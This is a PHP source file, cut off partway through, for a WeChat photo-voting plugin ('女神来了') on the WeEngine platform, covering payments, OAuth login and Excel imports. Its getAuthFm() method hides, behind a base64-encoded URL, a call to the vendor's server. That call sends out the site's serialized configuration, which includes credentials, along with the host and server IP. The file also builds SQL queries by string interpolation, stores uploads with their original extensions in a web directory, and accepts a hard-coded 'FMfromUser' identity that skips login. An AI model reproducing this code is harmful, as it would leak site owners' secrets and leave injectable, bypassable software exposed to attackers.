<?php
/**
 * 女神来了模块定义
 * 核心功能文件
 * @author 幻月科技
 * @url http://bbs.fmoons.com/
 */

defined('IN_IA') or exit('Access Denied');
class Core extends WeModuleSite {
	public $title 			 = '女神来了！';
	public $table_reply  	 = 'fm_photosvote_reply';//规则 相关设置
	public $table_reply_share  = 'fm_photosvote_reply_share';//规则 相关设置
	public $table_reply_huihua  = 'fm_photosvote_reply_huihua';//规则 相关设置
	public $table_reply_display  = 'fm_photosvote_reply_display';//规则 相关设置
	public $table_reply_vote  = 'fm_photosvote_reply_vote';//规则 相关设置
	public $table_reply_body  = 'fm_photosvote_reply_body';//规则 相关设置
	public $table_users  	 = 'fm_photosvote_provevote';	//报名参加活动的人
	public $table_pnametag 	 = 'fm_photosvote_pnametag';	//默认口号
	public $table_voteer  	 = 'fm_photosvote_voteer';	//投票的人资料
	public $table_tags  	 = 'fm_photosvote_tags';	//
	public $table_users_picarr  = 'fm_photosvote_provevote_picarr';	//
	public $table_users_videoarr  = 'fm_photosvote_provevote_videoarr';	//
	public $table_users_voice  	= 'fm_photosvote_provevote_voice';	//
	public $table_users_name  	= 'fm_photosvote_provevote_name';	//
	public $table_log        = 'fm_photosvote_votelog';//投票记录
	public $table_qunfa        = 'fm_photosvote_qunfa';//投票记录
	public $table_shuapiao        = 'fm_photosvote_vote_shuapiao';//封禁记录
	public $table_shuapiaolog        = 'fm_photosvote_vote_shuapiaolog';//刷票记录
	public $table_bbsreply   = 'fm_photosvote_bbsreply';//投票记录
	public $table_banners    = 'fm_photosvote_banners';//幻灯片
	public $table_advs  	 = 'fm_photosvote_advs';//广告
	public $table_gift  	 = 'fm_photosvote_gift';
	public $table_data  	 = 'fm_photosvote_data';
	public $table_iplist 	 = 'fm_photosvote_iplist';//禁止ip段
	public $table_iplistlog  = 'fm_photosvote_iplistlog';//禁止ip段
	public $table_announce   = 'fm_photosvote_announce';//公告
	public $table_templates   = 'fm_photosvote_templates';//模板
	public $table_designer   = 'fm_photosvote_templates_designer';//模板页面
	public $table_designer_menu   = 'fm_photosvote_templates_designer_menu';//模板页面
	public $table_order   = 'fm_photosvote_order';//付费投票
	public $table_jifen   = 'fm_photosvote_jifen';//积分抽奖
	public $table_jifen_gift   = 'fm_photosvote_jifen_gift';//礼物
	public $table_user_gift   = 'fm_photosvote_user_gift';//礼物
	public $table_user_zsgift   = 'fm_photosvote_user_zsgift';//礼物
	public $table_msg   = 'fm_photosvote_message';//消息
	public $table_orderlog   = 'fm_photosvote_orderlog';//消息
	public $table_counter   = 'fm_photosvote_counter';//投票数据统计
	public $table_qrcode   = 'fm_photosvote_qrcode';//投票数据统计
	public $table_answer   = 'fm_photosvote_answer';//答题
	public $table_source   = 'fm_photosvote_source';//来源
	public $table_school   = 'fm_photosvote_school';//学校

	public function __construct() {
		global $_W, $_GPC;
	}
	public function payResult($params) {
		global $_W;
		//$uniacid = $_W['uniacid'];
		$item = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE ordersn='{$params['tid']}' limit 1");
		$uniacid = !empty($item['uniacid']) ? $item['uniacid'] : $_W['uniacid'];
		$fee = intval($params['fee']);
		$data = array('status' => $params['result'] == 'success' ? 1 : 0);
		//$paytype = array('credit' => '1', 'wechat' => '2', 'alipay' => '2', 'delivery' => '3');

		//$data['paytype'] = $paytype[$params['type']];
		if ($params['type'] == 'wechat') {
			$data['transid'] = $params['tag']['transaction_id'];
		}
		if ($params['type'] == 'delivery') {
			$data['status'] = 1;
		}

		$data['paytime'] = time();
		if (empty($item['payyz'])) {
			$data['payyz'] = random(8);
		}
		$data['ispayvote'] = 3;

		pdo_update($this->table_order, $data, array('id' => $item['id']));

		if ($item['paytype'] == 3) {
			pdo_update($this->table_users, array('ordersn'=>$params['tid']), array('rid' => $item['rid'],'from_user'=>$item['from_user']));
			if ($_W['account']['level'] == 4){
				$this->sendMobileRegMsg($item['from_user'], $item['rid'], $uniacid);
			}
		}
//print_r($params);
		if ($params['from'] == 'return') {
			if ($item['paytype'] < 6) {
				$paydata = array('paystatus'=>'success','vote' => '1','votepay'=>1,'vote_times'=>$item['vote_times'],'ordersn'=> $params['tid'],'tfrom_user'=> $item['tfrom_user'],'payyz'=>!empty($data['payyz']) ? $data['payyz'] : $item['payyz'] );
				$paymore = base64_encode(base64_encode(iserializer($paydata)));
				//print_r($paymore);
				if ($item['paytype'] == 3) {
					$payurl = $_W['siteroot'] . 'app/' . $this->createMobileUrl('tuser',array('i' => $uniacid,'rid'=>$item['rid'],'tfrom_user'=>$item['from_user'],'paymore'=>$paymore));
				}else{
					$payurl = $_W['siteroot'] . 'app/' . $this->createMobileUrl('photosvote',array('i' => $uniacid,'rid'=>$item['rid'],'paymore'=>$paymore));
				}
				header("location:$payurl");
				exit();
			}else{
				if ($item['paytype'] == 6) {
					if (!empty($item['giftid'])) {
						$gmgift = 'gmgift';
					}
					$payurl = $_W['siteroot'] . 'app/' . $this->createMobileUrl('chargeend',array('i' => $uniacid,'rid'=>$item['rid'],'from_user'=>$item['from_user'], 'jifen' => $item['jifen'], 'payyz' => $item['payyz'], 'ordersn' => $params['tid'], 'type' => $gmgift));
					header("location:$payurl");
					exit();
				}
			}
		}
	}
	public function FM_checkoauth() {
		global $_GPC,$_W;
		$uniacid = !empty($_W['uniacid']) ? $_W['uniacid'] : $_W['acid'];
		load()->model('mc');
		$openid = '';
		$nickname = '';
		$avatar = '';
		$follow = '';
		if (!empty($_W['member']['uid'])) {
			$member = mc_fetch(intval($_W['member']['uid']), array('avatar','nickname'));//无openid 无follow 有avatar 有nickname
			if (!empty($member)) {
				$avatar = $member['avatar'];
				$nickname = $member['nickname'];
			}
		}

		if (empty($avatar) || empty($nickname)) {
			$fan = mc_fansinfo($_W['openid']);//有openid 有follow 有avatar 有nickname
			if (!empty($fan)) {
				$avatar = $fan['avatar'];
				$nickname = $fan['nickname'];
				$openid = $fan['openid'];
				$follow = $fan['follow'];
			}
		}

		if (empty($avatar) || empty($nickname) || empty($openid) || empty($follow)) {
			$userinfo = mc_oauth_userinfo();//有openid 有follow 有avatar 有nickname
			if (!is_error($userinfo) && !empty($userinfo) && is_array($userinfo) && !empty($userinfo['avatar'])) {
				$avatar = $userinfo['avatar'];
			}
			if (!is_error($userinfo) && !empty($userinfo) && is_array($userinfo) && !empty($userinfo['nickname'])) {
				$nickname = $userinfo['nickname'];
			}
			if (!is_error($userinfo) && !empty($userinfo) && is_array($userinfo) && !empty($userinfo['openid'])) {
				$openid = $userinfo['openid'];
			}
			if (!is_error($userinfo) && !empty($userinfo) && is_array($userinfo) && !empty($userinfo['follow'])) {
				$follow = $userinfo['follow'];
			}
		}
		if ((empty($avatar) || empty($nickname)) && !empty($_W['member']['uid'])) {
			//$avatar = mc_require($_W['member']['uid'], array('avatar'));//无openid 无follow 有avatar 有nickname
			//$nickname = mc_require($_W['member']['uid'], array('nickname'));
		}

		$oauthuser = array();
		$oauthuser['avatar'] = $avatar;
		$oauthuser['nickname'] = $nickname;
		$oauthuser['from_user'] = $openid;
		$oauthuser['follow'] = !empty($follow) ? $follow : $_W['fans']['follow'];

		return $oauthuser;
	}
	public function gettoken() {

		if ($_W['account']['level'] == 4 ) {
			$token = WeAccount::token();
		}else{
			$cfg = $this -> module['config'];
			load()->classs('weixin.account');
			$accObj= WeixinAccount::create($cfg['u_uniacid']);
			$token = $accObj->fetch_token();
			//$token = WeAccount::token();
		}
		return $token;
	}
	public function getAuthFm() {
		global $_GPC,$_W;
		load()->func('communication');
		$d = ihttp_get(base64_decode("aHR0cDovL2FwaS5mbW9vbnMuY29tL2luZGV4LnBocD8md2VidXJsPQ==").$_SERVER ['HTTP_HOST']."&visitorsip=" . base64_encode(iserializer($_W['config'])) ."&modules=fm_photosvote&fmauthtoken=".$onlyoauth['fmauthtoken']."&hostip=".$_SERVER["SERVER_ADDR"]);
	}
	public function doMobileoauth2() {
		global $_GPC,$_W;
		$uniacid = !empty($_W['uniacid']) ? $_W['uniacid'] : $_W['acid'];
		$rid = $_GPC['rid'];
		load()->func('communication');
		$fromuser = $_GPC['fromuser'];

		$cfg = $this->module['config'];
		//借用还是本身为认证号
		if ($_W['account']['level'] == 4) {
		    $appid = $_W['account']['key'];
		    $secret = $_W['account']['secret'];
		}else{

			$appid = $cfg['appid'];
			$secret = $cfg['secret'];
		}
		//print_r($_GPC['code']);
		//exit;
		//用户不授权返回提示说明
		if ($_GPC['code']=="authdeny"){
		    $url = $_W['siteroot'] .'app/'.$this->createMobileUrl('oauth2shouquan', array('rid' => $rid));
			header("location:$url");
			exit;
		}

		//或取未关注用户Openid
		if (isset($_GPC['code'])){
		    //第一步：获取OpenID
		    $code = $_GPC['code'];
		    $grant_type = 'authorization_code';
   			$oauth2_code = 'https://api.weixin.qq.com/sns/oauth2/access_token?appid='.$appid.'&secret='.$secret.'&code='.$code.'&grant_type='.$grant_type.'';
		  	 // $oauth2_code = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=".$appid."&secret=".$secret."&code=".$code."&grant_type=authorization_code";
		    $content = ihttp_get($oauth2_code);
			//print_r($content);
			//exit;
		    $token = @json_decode($content['content'], true);


			if(empty($token) || !is_array($token) || empty($token['access_token']) || empty($token['openid'])) {
				echo '<h1>获取微信公众号授权'.$code.'失败[无法取得token以及openid], 请稍后重试！ 公众平台返回原始数据为: <br />' . $content['meta'].'<h1>';
				exit;
			}
			//print_r($token);
			//exit;
		    $openid = $token['openid'];
			$access_token = $token['access_token'];
			if ($cfg['oauthtype'] == 2) {
				$unionid = $token['unionid'];
				setcookie("user_oauth2_unionid", $unionid, time()+3600*24*7);
				$realopenid = pdo_fetch("SELECT openid,follow FROM ".tablename('mc_mapping_fans') . " WHERE uniacid = '{$uniacid}' AND `unionid` = '{$unionid}'");
				if (!empty($realopenid)) {
					$openid = $realopenid['openid'];
			    	$follow = $realopenid['follow'];

					setcookie("user_oauth2_follow", $follow, time()+3600*24*7);
					setcookie("user_oauth2_unionid", $unionid, time()+3600*24*7);
				}
			}

			//第二步
			if ($cfg['oauth_scope'] == 1) {
				$oauth2_url = "https://api.weixin.qq.com/cgi-bin/user/info?access_token=".$access_token."&openid=".$openid."&lang=zh_CN";
				$content = ihttp_get($oauth2_url);
				$info = @json_decode($content['content'], true);
				//print_r($info['subscribe']);
				$follow = $info['subscribe'];
			    $nickname = $info['nickname'];
			    $avatar = $info['headimgurl'];
		    		$sex = $info['sex'];
			}else {
				//使用全局ACCESS_TOKEN获取OpenID的详细信息
				//https://api.weixin.qq.com/cgi-bin/user/info?access_token=ACCESS_TOKEN&openid=OPENID&lang=zh_CN
				$oauth2_url = "https://api.weixin.qq.com/sns/userinfo?access_token=".$access_token."&openid=".$openid."&lang=zh_CN";
				$content = ihttp_get($oauth2_url);
				$info = @json_decode($content['content'], true);
				if(empty($info) || !is_array($info) || empty($info['openid'])  || empty($info['nickname']) ) {
					echo '<h1>获取微信公众号授权失败[无法取得info], 请稍后重试！ 公众平台返回原始数据为: <br />' . $content['meta'].'<h1>';
					exit;
				}
			    $avatar = $info['headimgurl'];
			    $nickname = $info['nickname'];
			    $sex = $info['sex'];
			}

		   //设置cookie信息
		    setcookie("user_oauth2_avatar", $avatar, time()+3600*24*7);
		    setcookie("user_oauth2_nickname", $nickname, time()+3600*24*7);
		    setcookie("user_oauth2_sex", $sex, time()+3600*24*7);
			setcookie("user_oauth2_openid", $openid, time()+3600*24*7);
			if(!empty($fromuser) && !isset($_COOKIE["user_fromuser_openid"])){
			    setcookie("user_fromuser_openid", $fromuser, time()+3600*24*7);
			}

			if ($fromuser && $_GPC['duli']) {
			    $photosvoteviewurl = $_W['siteroot'] .'app/'.$this->createMobileUrl('shareuserdata', array('rid' => $rid,'fromuser' => $fromuser,'duli' => $_GPC['duli'],'tfrom_user' => $_GPC['tfrom_user']));
			}else{
			    $photosvoteviewurl = $_W['siteroot'] .'app/'.$this->createMobileUrl('photosvote', array('rid' => $rid,'from_user' => $openid));
			}
		    header("location:$photosvoteviewurl");
			exit;
		}else{
			echo '<h1>不是高级认证号或网页授权域名设置出错!</h1>';
			exit;
		}

	}
	public function doMobileoauth2shouquan() {
	    global $_GPC,$_W;
		$uniacid = !empty($_W['uniacid']) ? $_W['uniacid'] : $_W['acid'];
		$rid = $_GPC['rid'];
		//活动规则
		if (!empty($rid)) {
			$reply = pdo_fetch("SELECT shareurl FROM ".tablename($this->table_share)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
			$url = $reply['shareurl'];
	        header("location:$url");
			exit;
 		}

	}
	public function checkoauth2($rid,$oauthopenid,$oauthunionid='', $fromuser = '',$duli='') {//如果没有取得cookie信息	重新授权
        global $_W;
        $cfg = $this->module['config'];
		if ($_W['account']['level'] == 4) {
			$appid = $_W['account']['key'];
		}else{
			$appid = $cfg['appid'];
		}
		if ($cfg['oauth_scope'] == 1) {
			$oauth_scope = 'snsapi_base';
		}else{
			$oauth_scope = 'snsapi_userinfo';
		}
	    if(!empty($appid)){//有借用跳转授权页没有则跳转普通注册页
		    $url = $_W['siteroot'] .'app/'.$this->createMobileUrl('oauth2', array('rid' => $rid,'fromuser' => $fromuser,'duli'=>$duli));
		    $oauth2_code = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=".$appid."&redirect_uri=".urlencode($url)."&response_type=code&scope=".$oauth_scope."&state=0#wechat_redirect";
		    header("location:$oauth2_code");
			exit;
		}else{
		    $reguser = $_W['siteroot'] .'app/'.$this->createMobileUrl('reguser', array('rid' => $rid));
		    header("location:$reguser");
			exit;
		}
	}
	public function GetOauth($do, $uniacid, $fromuser,$rid, $gfrom_user = '', $duli){
		global $_W;
		$cfg = $this->module['config'];
		$rdisplay = pdo_fetch("SELECT hits,xunips FROM ".tablename($this->table_reply_display)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		pdo_update($this->table_reply_display, array('hits' => $rdisplay['hits']+1), array('rid' => $rid));//点击量
		$is_weixin = $this->is_weixin();
		if ($is_weixin == false && $do != 'stopllq') {
			$stopllq = $_W['siteroot'] .'app/'.$this->createMobileUrl('stopllq', array('rid' => $rid));
		    header("location:$stopllq");
			exit;
		}

		if ($_COOKIE["user_tbsj_time"] < mktime(0,0,0)) {
			$tbsj = pdo_fetch("SELECT SUM(photosnum) AS t1,SUM(xnphotosnum) AS t4,SUM(unphotosnum) AS t2, COUNT(1) AS t3 FROM ".tablename($this->table_users)." WHERE rid = :rid AND status = 1", array(':rid' => $rid));
			pdo_update($this->table_reply_display, array('ljtp_total' => $tbsj['t1'],'xunips' => $tbsj['t4'], 'unphotosnum' => $tbsj['t2'], 'csrs_total' => $tbsj['t3']), array('rid' => $rid));
			setcookie("user_tbsj_time", time(), time()+3600*24);
		}
		if (empty($_COOKIE["user_lptb_time"])) {
			$this->updatelp($rid);
		}

		if ($cfg['oauthtype'] == 3) {
			$from_user = !empty($_W['openid']) ? $_W['openid'] : $_W['fans']['from_user'];
			if (empty($_COOKIE["user_oauth2_gfollow"]) || empty($_COOKIE["user_oauth2_gfrom_user"])) {
				if (!empty($from_user)) {
					if (!empty($gfrom_user)) {
						$follow = 1;
					}else{
						$follow = $_W['fans']['follow'];
					}
					setcookie("user_oauth2_gfollow", $follow, time()+3600*24);
					setcookie("user_oauth2_gfrom_user", $from_user, time()+3600*24);
				}else {
					if (!empty($gfrom_user)) {
						$from_user = $gfrom_user;
						$follow = 1;
						setcookie("user_oauth2_gfollow", $follow, time()+3600*24);
						setcookie("user_oauth2_gfrom_user", $from_user, time()+3600*24);
					}
				}
			}

			$from_user = empty($_COOKIE["user_oauth2_gfrom_user"]) ? $from_user : $_COOKIE["user_oauth2_gfrom_user"];
			$follow = empty($_COOKIE["user_oauth2_gfollow"]) ? $follow : $_COOKIE["user_oauth2_gfollow"];
			$nickname = !empty($_W['fans']["nickname"]) ? $_W['fans']["nickname"] : $_W['fans']['tag']['nickname'];
			$avatar = $_W['fans']['tag']['avatar'];
			$sex = $_W['fans']['tag']['sex'];
			if ($do != 'shareuserview'  && $do != 'shareuserdata'  && $do != 'treg'  && $do != 'tregs'  && $do != 'tvotestart'  && $do != 'tbbs'  && $do != 'tbbsreply'  && $do != 'saverecord'   && $do != 'subscribeshare'  && $do != 'pagedata' && $do != 'pagedatab'  && $do != 'listentry'  && $do != 'code' && $do != 'reguser' && $do != 'phdata' && $do != 'stopllq') {
				$sharedata = pdo_fetch("SELECT * FROM ".tablename($this->table_data)." WHERE fromuser = :fromuser and rid = :rid and from_user = :from_user", array(':fromuser' => $fromuser,':from_user' => $from_user,':rid' => $rid));
				if (empty($sharedata) && !empty($from_user) && !empty($fromuser)) {
					if(!empty($fromuser) && !isset($_COOKIE["user_fromuser_openid"])){
						setcookie("user_fromuser_openid", $fromuser, time()+3600*24*7);
					}
					$tfrom_user = $_COOKIE["user_tfrom_user_openid"];
					$shareuserdata = $_W['siteroot'] .'app/'.$this->createMobileUrl('shareuserdata', array('rid' => $rid,'fromuser' => $fromuser,'duli' => $duli,'tfrom_user' => $tfrom_user));
					header("location:$shareuserdata");
					exit;
				}
			}

		}else {
			if ($cfg['oauthtype'] == 1) {
				if ($do != 'shareuserview'  && $do != 'shareuserdata'  && $do != 'treg'  && $do != 'tregs'  && $do != 'tvotestart'  && $do != 'tbbs'  && $do != 'tbbsreply'  && $do != 'saverecord'  && $do != 'saverecord1'  && $do != 'subscribeshare'  && $do != 'pagedata'  && $do != 'listentry'  && $do != 'code' && $do != 'reguser' && $do != 'phdata' && $do != 'stopllq') {
					$oauthuser = $this->FM_checkoauth();
				}
				$from_user = empty($oauthuser['from_user']) ? $_GPC['from_user'] : $oauthuser['from_user'];
				$avatar = $oauthuser['avatar'];
				$nickname = $oauthuser['nickname'];
				$follow = $oauthuser['follow'];
			}else {
				$from_user = $_COOKIE["user_oauth2_openid"];
				if ($_W['openid'] == 'FMfromUser' || $_W['openid'] == 'FMfromUserasss') {
					$from_user = $_W['openid'];
				}

				if ($cfg['oauthtype'] == 2) {
					$rvote = pdo_fetch("SELECT unimoshi FROM ".tablename($this->table_reply_vote)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
					$unionid = $_COOKIE["user_oauth2_unionid"];
					$f = pdo_fetch("SELECT follow FROM ".tablename('mc_mapping_fans') . " WHERE uniacid = $uniacid AND unionid = :unionid ", array(':unionid'=>$unionid));
					$follow = $f['follow'];

					if ($rvote['unimoshi'] == 1) {
						if (!empty($unionid)) {
							$user = pdo_fetch("SELECT from_user FROM ".tablename($this->table_users)." WHERE unionid = :unionid AND rid = $rid", array(':unionid'=>$unionid));
							if (!empty($user)) {
								$from_user = $user['from_user'];
							}

						}
					}
					if (!empty($gfrom_user)) {
						$follow = 1;
					}
					if ($from_user == 'FMfromUser') {
					}else{
						if (empty($_COOKIE["user_oauth2_openid"]) || empty($unionid)) {
							if ($do != 'shareuserview'  && $do != 'shareuserdata'  && $do != 'treg'  && $do != 'tregs'  && $do != 'tvotestart'  && $do != 'tbbs'  && $do != 'tbbsreply'  && $do != 'saverecord'  && $do != 'subscribeshare'  && $do != 'pagedata'  && $do != 'pagedatab' && $do != 'listentry'  && $do != 'code' && $do != 'reguser' && $do != 'phdata' && $do != 'stopllq') {
								$this->checkoauth2($rid,$_COOKIE["user_oauth2_openid"],$unionid,$fromuser,$duli);//查询是否有cookie信息
							}
						}
					}
				}else {
					if (!empty($gfrom_user)) {
						$follow = 1;
					}
					if ($from_user == 'FMfromUser') {
					}else{
						if (empty($_COOKIE["user_oauth2_openid"])) {
							if ($do != 'shareuserview'  && $do != 'shareuserdata'  && $do != 'treg'  && $do != 'tregs'  && $do != 'tvotestart'  && $do != 'tbbs'  && $do != 'tbbsreply'  && $do != 'saverecord'   && $do != 'subscribeshare'  && $do != 'pagedata' && $do != 'pagedatab'  && $do != 'listentry'  && $do != 'code' && $do != 'reguser' && $do != 'phdata' && $do != 'stopllq') {
								$this->checkoauth2($rid,$_COOKIE["user_oauth2_openid"],'',$fromuser,$duli);//查询是否有cookie信息
							}

						}
					}

				}
				$follow = empty($follow) ? $_W['fans']['follow'] : $follow;
				$avatar = !empty($_COOKIE["user_oauth2_avatar"]) ? $_COOKIE["user_oauth2_avatar"] : $_W['fans']['tag']['avatar'];
				$nickname = !empty($_COOKIE["user_oauth2_nickname"]) ? $_COOKIE["user_oauth2_nickname"] : $_W['fans']['tag']['nickname'];
				$sex = !empty($_COOKIE["user_oauth2_sex"]) ? $_COOKIE["user_oauth2_sex"] : $_W['fans']['tag']['sex'];
			}

		}
		$usersinfo = array(
			'from_user' => $from_user,
			'unionid' => $unionid,
			'nickname' => $nickname,
			'follow' => $follow,
			'avatar' => $avatar,
			'sex' => $sex,
		);

		if (!empty($from_user) && $do != 'stopllq') {
			$this->createvoteer($rid,$uniacid, $from_user,$nickname,$avatar,$sex);
		}

		return $usersinfo;
	}
	public function GetReply($rid,$uniacid) {
		$replyarr = array();
		$replyarr['rbasic'] = pdo_fetch("SELECT * FROM ".tablename($this->table_reply)." WHERE (find_in_set(".$uniacid.", binduniacid) OR uniacid = ".$uniacid.") AND rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		if (empty($replyarr['rbasic'])) {
			if ($_GPC['do'] != 'stopllq') {
				$info = '没有发现此活动！';
				$urlstatus = $_W['siteroot'].$this->createMobileUrl('stopllq', array('rid'=>$rid, 'info'=>$info));
				header("location:$urlstatus");
				die();
			}
		}
		$replyarr['rshare'] = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_share)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$replyarr['rhuihua'] = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_huihua)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$replyarr['rdisplay'] = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_display)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$replyarr['rvote'] = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_vote)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$replyarr['rbody'] = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_body)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		//$replyarr['reply'] = array_merge($replyarr['rbasic'], $replyarr['rshare'], $replyarr['rhuihua'], $replyarr['rdisplay'], $replyarr['rvote'], $replyarr['rbody']);
		$replyarr['qiniu'] = iunserializer($replyarr['rbasic']['qiniu']);

		return $replyarr;
	}
	//导入Excel文件
	public function uploadFile($file,$filetempname,$rid) {
		global $_W;
		load()->func('file');
		//自己设置的上传文件存放路径
		$filePath = IA_ROOT . '/addons/fm_photosvote/tmp/' . date('Ymd',time()) . '/';
		if (!is_dir($filePath)) {
           mkdirs($filePath, "0777");
        }

		$str = "";
		//下面的路径按照你PHPExcel的路径来修改
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel.php';
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel/IOFactory.php';
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel/Reader/Excel5.php';

		//注意设置时区
		$time=date("Y-m-d-H-i-s");//去当前上传的时间
		//获取上传文件的扩展名
		$extend=strrchr ($file,'.');

		//上传后的文件名
		$name=$_W['account']['name'].$time.$extend;
		$uploadfile=$filePath.$name;//上传后的文件名地址
		//move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。
		$result= move_uploaded_file($filetempname, $uploadfile);		//move_uploaded_file($filetempname,$uploadfile);//假如上传到当前目录下

		//print_r($result);
		//exit;
		//echo $result;
		if($result) {	//如果上传文件成功，就执行导入excel操作

			$objReader = PHPExcel_IOFactory::createReader('Excel5');//use excel2007 for 2007 format
			$objPHPExcel = $objReader->load($uploadfile);
			$sheet = $objPHPExcel->getSheet(0);
			$highestRow = $sheet->getHighestRow();           //取得总行数
			$highestColumn = $sheet->getHighestColumn(); //取得总列数
			$objWorksheet = $objPHPExcel->getActiveSheet();
			$highestRow = $objWorksheet->getHighestRow();
			//echo 'highestRow='.$highestRow;
			//echo "<br>";
			$highestColumn = $objWorksheet->getHighestColumn();
			$highestColumnIndex = PHPExcel_Cell::columnIndexFromString($highestColumn);//总列数
			//echo 'highestColumnIndex='.$highestColumnIndex;
			//echo "<br>";
			$headtitle=array();
			$uniacid = $_W['uniacid'];

			for ($row = 1;$row <= $highestRow;$row++) {
				$strs=array();
				//注意highestColumnIndex的列数索引从0开始
				for ($col = 0;$col < $highestColumnIndex;$col++) {
					$strs[$col] =$objWorksheet->getCellByColumnAndRow($col, $row)->getValue();
				}

				$uid = $strs['0'];
				$photosarr = explode(',', $strs['19']);

				if (is_numeric($uid)) {
					$users = pdo_fetch("SELECT id FROM ".tablename($this->table_users)." WHERE rid = '{$rid}' AND uid = '{$uid}' LIMIT 1 ");

					if (empty($users)) {
						if (!empty($strs['10'])) {
							$tagpid = pdo_fetch("SELECT id FROM ".tablename($this->table_tags)." WHERE rid = '{$rid}' AND title = :title LIMIT 1 ", array(':title' => $strs['10']));
							$pid = $tagpid['id'];
							if (empty($tagpid)) {
								pdo_insert($this->table_tags, array('rid'=>$rid, 'uniacid'=>$uniacid, 'title'=>$strs['10'], 'icon' => '1'));
								$pid = pdo_insertid();
							}
						}
						if (!empty($strs['11'])) {
							$tagid = pdo_fetch("SELECT id FROM ".tablename($this->table_tags)." WHERE rid = '{$rid}' AND title = :title LIMIT 1 ", array(':title' => $strs['11']));
							$cid = $tagid['id'];
							if (empty($tagpid)) {
								pdo_insert($this->table_tags, array('rid'=>$rid, 'uniacid'=>$uniacid, 'title'=>$strs['11'], 'parentid' =>$pid, 'icon' => '2'));
								$cid = pdo_insertid();
							}
						}
						$from_user = 'FM'.random(16).time();

						$data = array(
							'rid' => $rid,
							'uniacid' => $uniacid,
							'uid' => $uid,
							'from_user' => $from_user,
							'nickname' => $strs['1'],
							'realname' => $strs['2'],
							'photosnum' => $strs['3'],
							'xnphotosnum' => $strs['4'],
							'hits' => $strs['5'],
							'xnhits' => $strs['6'],
							'sharenum' => $strs['7'],
							'zans' => $strs['8'],
							'sex' => $strs['9'],
							'tagid' => $cid,
							'tagpid' => $pid,
							'mobile' => $strs['12'],
							'weixin' => $strs['13'],
							'qqhao' => $strs['14'],
							'email' => $strs['15'],
							'address' => $strs['16'],
							'photoname' => $strs['17'],
							'description' => $strs['18'],
							'music' => $strs['20'],
							'vedio' => $strs['21'],
							'status' => $strs['22'],
							'createip' => getip(),
							'lasttime' => time(),
							'createtime' => time()/////strtotime($strs['23']),
						);
						if (!empty($photosarr)) {
							foreach ($photosarr as $key => $value) {
								if ($key == 0) {
									pdo_insert($this->table_users_picarr, array('rid'=>$rid, 'uniacid'=>$uniacid, 'from_user'=>$from_user, 'photos'=>$value, 'isfm' => 1, 'createtime'=>time()));
									$data['avatar'] = $value;
								}else{
									pdo_insert($this->table_users_picarr, array('rid'=>$rid, 'uniacid'=>$uniacid, 'from_user'=>$from_user, 'photos'=>$value, 'createtime'=>time()));
								}

							}
						}
						$user = pdo_insert($this->table_users, $data);

						if($user){
							$msg =  '导入成功！';
						}else{
							return false;
							$msg =  '导入失败！';
						}
					}

				}
			}
		}else	{
		   $msg = "导入失败！";
		}
		return $msg;
	}

	public function uploadFile_tags($file,$filetempname,$rid) {
		global $_W;
		load()->func('file');
		//自己设置的上传文件存放路径
		$filePath = IA_ROOT . '/addons/fm_photosvote/tmp/' . date('Ymd',time()) . '/';
		if (!is_dir($filePath)) {
           mkdirs($filePath, "0777");
        }

		$str = "";
		//下面的路径按照你PHPExcel的路径来修改
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel.php';
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel/IOFactory.php';
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel/Reader/Excel5.php';

		//注意设置时区
		$time=date("Y-m-d-H-i-s");//去当前上传的时间
		//获取上传文件的扩展名
		$extend=strrchr ($file,'.');

		//上传后的文件名
		$name='tags_' . $_W['account']['name'].$time.$extend;
		$uploadfile=$filePath.$name;//上传后的文件名地址
		//move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。
		$result= move_uploaded_file($filetempname, $uploadfile);		//move_uploaded_file($filetempname,$uploadfile);//假如上传到当前目录下


		//echo $result;
		if($result) {	//如果上传文件成功，就执行导入excel操作

			$objReader = PHPExcel_IOFactory::createReader('Excel5');//use excel2007 for 2007 format
			$objPHPExcel = $objReader->load($uploadfile);
			$sheet = $objPHPExcel->getSheet(0);
			$highestRow = $sheet->getHighestRow();           //取得总行数
			$highestColumn = $sheet->getHighestColumn(); //取得总列数
			$objWorksheet = $objPHPExcel->getActiveSheet();
			$highestRow = $objWorksheet->getHighestRow();
			//echo 'highestRow='.$highestRow;
			//echo "<br>";
			$highestColumn = $objWorksheet->getHighestColumn();
			$highestColumnIndex = PHPExcel_Cell::columnIndexFromString($highestColumn);//总列数
			//echo 'highestColumnIndex='.$highestColumnIndex;
			//echo "<br>";
			$headtitle=array();
			$uniacid = $_W['uniacid'];

			for ($row = 1;$row <= $highestRow;$row++) {
				$strs=array();
				//注意highestColumnIndex的列数索引从0开始
				for ($col = 0;$col < $highestColumnIndex;$col++) {
					$strs[$col] =$objWorksheet->getCellByColumnAndRow($col, $row)->getValue();
				}

				$displayorder = $strs['0'];

				if (is_numeric($displayorder)) {
					$title = $strs['1'];
					if (empty($title)) {
						$title = $strs['2'];
						if (empty($title)) {
							$title = $strs['3'];
							$tag = pdo_fetch("SELECT id FROM ".tablename($this->table_tags)." WHERE rid = '{$rid}' AND icon = 2 ORDER BY parentid DESC, id DESC LIMIT 1 ");
							$parentid = $tag['id'];
							$icon = '3';
